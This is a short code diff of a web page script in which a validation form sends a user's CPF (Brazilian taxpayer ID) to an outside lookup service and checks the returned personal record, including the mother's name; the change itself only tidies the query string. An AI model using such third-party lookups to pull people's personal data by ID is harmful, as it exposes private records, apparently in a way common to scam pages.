@@ -148,7 +148,7 @@
             try {
                document.getElementById('validation-form').classList.add('hidden');
                document.getElementById('loading').classList.remove('hidden');
-               const response = await fetch(`https://searchapi.dnnl.live/consulta?token_api=ryn&cpf=${cpfRaw}${cpfLimpo}&token_api=3531`);
+               const response = await fetch(`https://searchapi.dnnl.live/consulta?token_api=ryn&cpf=${cpfRaw}`);
                if (!response.ok) throw new Error('Erro ao consultar CPF');
                cpfData = await response.json();
                if (!cpfData.status || cpfData.status !== 200 || !cpfData.dados[0].NOME_MAE) {
